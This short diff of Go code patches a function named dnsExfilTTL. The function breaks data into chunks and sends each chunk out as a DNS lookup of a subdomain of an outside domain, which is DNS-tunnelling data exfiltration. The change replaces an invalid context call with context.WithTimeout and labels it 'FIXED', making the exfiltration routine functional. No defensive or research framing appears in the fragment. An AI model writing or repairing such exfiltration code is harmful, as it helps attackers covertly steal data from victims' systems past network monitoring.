@@ -772,7 +772,9 @@ func dnsExfilTTL(data []byte) bool {
 
 	for i, chunk := range chunks {
 		fqdn := fmt.Sprintf("%s.%s", chunk, domain)
-		ctx, cancel := context.ContextWithTimeout(context.Background(), DNS_RESOLVE_TIMEOUT)
+		
+		// FIXED: Uses context.WithTimeout instead of ContextWithTimeout
+		ctx, cancel := context.WithTimeout(context.Background(), DNS_RESOLVE_TIMEOUT)
 		defer cancel()
 
 		TTL := (i*17 + len(chunk)) % 255
